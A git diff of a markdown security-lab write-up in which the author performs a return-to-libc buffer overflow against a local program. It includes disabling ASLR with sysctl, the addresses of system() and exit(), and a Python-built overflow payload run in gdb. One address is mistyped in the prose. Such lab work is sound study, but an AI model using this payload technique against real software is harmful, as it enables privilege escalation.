@@ -63,20 +63,26 @@ _load_data:
 Description text (optional)
 For this lab, i will use a docker container to do. It will be mapped to my Seclabs directoy
 ![alt text](image-38.png)
+
 Then i will compile C asm program and C program to executable code
 ![alt text](image-37.png)
+
 I will use an older bash and turn off randomly given stack value.
 `sudo sysctl -w kernel.randomize_va_space=0`
 ![alt text](image-39.png)
 The stack frame of main function
+
 ![alt text](image-32.png)
 The pwd of the copy_file: 
 ![alt text](image-40.png)
-Create a global environment varibale using `export my_path="/home/seed/seclabs/copy_file"`
+Create a global environment varibale using `export my_path="/home/seed/seclabs/copy_file"`.
+
 Then i will set root for user to write:
 ![alt text](image-50.png)
+
 I will find the address of system and exit and that string of varibale:
 ![alt text](image-41.png)
+
 Address value of system: 0xf7e50db0 will be inserted with format \xb0\x0d\xe5\xf7
 
 Address value of exit: 0xf7e449e0 will be inserted with format \xe0\x49\xe4\f7
@@ -87,6 +93,7 @@ So the command will be:
 `r $(python -c "print('a'*20 + '\xb0\x0d\xe5\xf7' + '\xe0\x49\xe4\xf7' +  '\x4c\xd9\xff\xff')")`
 Before i run this command:
 ![alt text](image-51.png)
+
 And the output when i run this command: 
 
 ![alt text](image-49.png)
